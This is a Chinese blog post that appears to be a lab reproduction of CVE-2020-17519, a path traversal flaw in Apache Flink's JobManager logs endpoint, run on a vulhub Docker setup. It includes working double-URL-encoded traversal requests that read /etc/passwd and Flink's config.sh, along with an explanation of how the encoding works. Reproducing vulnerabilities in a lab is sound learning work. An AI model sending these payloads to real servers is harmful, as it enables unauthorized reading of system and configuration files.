ailx10说：这篇是我2023年9月写的。Flink 在大数据安全分析里并不陌生，这次我换了个角度，去看 JobManager 的日志接口为什么会读到预期目录之外的文件。实验里先读系统文件，再看安装目录下的配置脚本，重点其实藏在路径的多层编码里。肉眼看着都像斜杠，交给不同环节解码以后，含义却会变。这篇就把请求和结果放在一起，提醒我遇到编码问题时一层一层拆，不把读到一个文件直接说成整个文件系统都能随便拿。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明Apache Flink jobmanager/logs 路径穿越 (CVE-2020-17519)环境搭建成功了

![](/notes-assets/cd290fcc1c41cf5d69fd.webp)

原请求中的 %252f 第一次 URL 解码后成为 %2f；如果后续组件再次解码，才会得到 /。实际是否发生两次解码应结合处理链验证。

```
http://144.34.162.13:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

![](/notes-assets/782a073c7530320af8ac.webp)

说是任意文件读取，那么读取网站代码，网站配置文件，就会有很大的风险了

```
http://144.34.162.13:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fopt%252fflink%252fbin%252fconfig.sh
```

![](/notes-assets/16d6964f0092c95c2398.webp)
